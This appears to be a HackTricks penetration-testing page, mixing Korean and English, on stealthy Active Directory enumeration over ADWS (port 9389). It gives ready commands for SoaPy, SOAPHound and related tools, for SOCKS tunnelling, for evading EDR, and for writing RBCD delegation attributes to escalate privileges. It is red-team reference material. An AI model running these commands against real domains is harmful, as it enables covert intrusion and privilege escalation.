# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화되어 있으며** TCP **9389**를 리스닝합니다. 이름과 달리 **HTTP는 전혀 관여하지 않습니다**. 대신 서비스는 LDAP 스타일의 데이터를 독점적인 .NET 프레이밍 프로토콜 스택을 통해 노출합니다:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

이 트래픽은 이진 SOAP 프레임 안에 캡슐화되어 있고 흔치 않은 포트를 사용하므로, **ADWS를 통한 열람은 기존의 LDAP/389 & 636 트래픽보다 검사, 필터링 또는 시그니처 탐지에 걸릴 가능성이 훨씬 낮습니다**. 운영자에게 주는 의미는 다음과 같습니다:

* 더 은밀한 리콘 – 블루팀은 종종 LDAP 쿼리에 집중합니다.
* SOCKS 프록시를 통해 9389/TCP를 터널링함으로써 **non-Windows hosts (Linux, macOS)** 에서도 수집 가능.
* LDAP로 얻을 수 있는 동일한 데이터(사용자, 그룹, ACL, 스키마 등)와 **쓰기** 기능(예: `msDs-AllowedToActOnBehalfOfOtherIdentity`를 이용한 **RBCD**)을 사용할 수 있습니다.

ADWS 상호작용은 WS-Enumeration 위에서 구현됩니다: 모든 쿼리는 LDAP 필터/속성을 정의하고 `EnumerationContext` GUID를 반환하는 `Enumerate` 메시지로 시작하며, 그 다음 서버가 정의한 결과 창까지 스트리밍하는 하나 이상의 `Pull` 메시지가 이어집니다. Context는 약 30분 후 만료되므로, 도구는 결과를 페이지네이션하거나 상태 손실을 피하기 위해 필터를 분할(예: CN별 프리픽스 쿼리)해야 합니다. 보안 설명자(security descriptors)를 요청할 때는 SACL을 생략하려면 `LDAP_SERVER_SD_FLAGS_OID` 컨트롤을 지정하세요. 그렇지 않으면 ADWS는 SOAP 응답에서 `nTSecurityDescriptor` 속성을 단순히 제거합니다.

> 참고: ADWS는 많은 RSAT GUI/PowerShell 도구에서도 사용되므로 트래픽이 합법적인 관리자 활동과 섞일 수 있습니다.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy)는 **순수 Python으로 구현된 ADWS 프로토콜 스택의 전체 재구현**입니다. NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 제작하여 .NET 런타임에 접근하지 않고 Unix 계열 시스템에서 수집할 수 있게 합니다.

### Key Features

* **proxying through SOCKS** 지원(C2 임플란트에서 유용).
* LDAP `-q '(objectClass=user)'`와 동일한 정밀한 검색 필터.
* 선택적 **write** 작업( `--set` / `--delete` ).
* BloodHound로 직접 수집 가능한 **BOFHound output mode**.
* 사람이 읽기 좋게 만들기 위한 `--parse` 플래그(타임스탬프 / `userAccountControl` 예쁘게 표시).

### Targeted collection flags & write operations

SoaPy는 ADWS를 통해 가장 일반적인 LDAP 헌팅 작업을 재현하는 엄선된 스위치를 제공합니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, 그리고 커스텀 풀을 위한 raw `--query` / `--filter` 옵션. 이를 `--rbcd <source>`(msDs-AllowedToActOnBehalfOfOtherIdentity 설정), `--spn <service/cn>`(대상 Kerberoasting을 위한 SPN 스테이징), `--asrep`(userAccountControl에서 DONT_REQ_PREAUTH 토글) 같은 쓰기 프리미티브와 함께 사용하세요.

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
같은 host/credentials를 사용해 즉시 findings를 weaponise하세요: `--rbcds`로 RBCD-capable objects를 덤프한 다음, `--rbcd 'WEBSRV01$' --account 'FILE01$'`를 적용해 Resource-Based Constrained Delegation 체인을 stage하세요 (전체 abuse path는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

### 설치 (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* LDAP-signature hits를 줄이기 위해 LDAP 쿼리를 TCP/9389의 ADWS 호출로 교체하는 `ldapdomaindump`의 포크.
* `--force`가 전달되지 않으면 포트 9389에 대해 초기 도달성 확인을 수행합니다(포트 스캔이 시끄럽거나 필터링되는 경우 프로브를 건너뜁니다).
* `README`에 성공적인 우회가 포함된 상태로 Microsoft Defender for Endpoint 및 CrowdStrike Falcon을 대상으로 테스트됨.

### 설치
```bash
pipx install .
```
### 사용법
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
일반적인 출력은 9389 도달성 확인, ADWS bind, 그리고 dump 시작/종료를 기록합니다:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang용 ADWS 실용 클라이언트

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **객체 검색 및 가져오기** - `query` / `get`
* **객체 수명 주기** - `create [user|computer|group|ou|container|custom]` and `delete`
* **속성 편집** - `attr [add|replace|delete]`
* **계정 관리** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – 대량 ADWS 수집 (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is a .NET collector that keeps all LDAP interactions inside ADWS and emits BloodHound v4-compatible JSON. It builds a complete cache of `objectSid`, `objectGUID`, `distinguishedName` and `objectClass` once (`--buildcache`), then re-uses it for high-volume `--bhdump`, `--certdump` (ADCS), or `--dnsdump` (AD-integrated DNS) passes so only ~35 critical attributes ever leave the DC. AutoSplit (`--autosplit --threshold <N>`) automatically shards queries by CN prefix to stay under the 30-minute EnumerationContext timeout in large forests.

도메인에 조인된 운영자 VM에서의 전형적인 워크플로:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
내보낸 JSON은 SharpHound/BloodHound 워크플로우로 직접 넣을 수 있습니다—자세한 하류 그래프 아이디어는 [BloodHound methodology](bloodhound.md)를 참조하세요. AutoSplit은 수백만 개 객체 포리스트에서도 SOAPHound를 탄력적으로 만들며, 쿼리 수를 ADExplorer-style 스냅샷보다 낮게 유지합니다.

## 스텔스 AD 수집 워크플로우

다음 워크플로우는 ADWS를 통해 **도메인 및 ADCS 객체**를 열거하고, 이를 BloodHound JSON으로 변환한 뒤 인증서 기반 공격 경로를 탐색하는 방법을 보여줍니다 – 모두 Linux에서:

1. **타깃 네트워크에서 자신의 머신으로 9389/TCP 터널링** (예: Chisel, Meterpreter, SSH dynamic port-forward 등).  `export HTTPS_PROXY=socks5://127.0.0.1:1080`를 설정하거나 SoaPy’s `--proxyHost/--proxyPort`를 사용하세요.

2. **루트 도메인 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC에서 ADCS 관련 객체를 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP을 업로드**한 후 BloodHound GUI에서 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 같은 cypher 쿼리를 실행하여 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### 쓰기 `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combine this with `s4u2proxy`/`Rubeus /getticket` for a full **Resource-Based Constrained Delegation** chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Tooling Summary

| 목적 | 도구 | 비고 |
|---------|------|-------|
| ADWS 열거 | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| 대규모 ADWS 덤프 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound 수집 | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| 인증서 침해 | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS 열거 및 객체 변경 | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## 참고자료

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
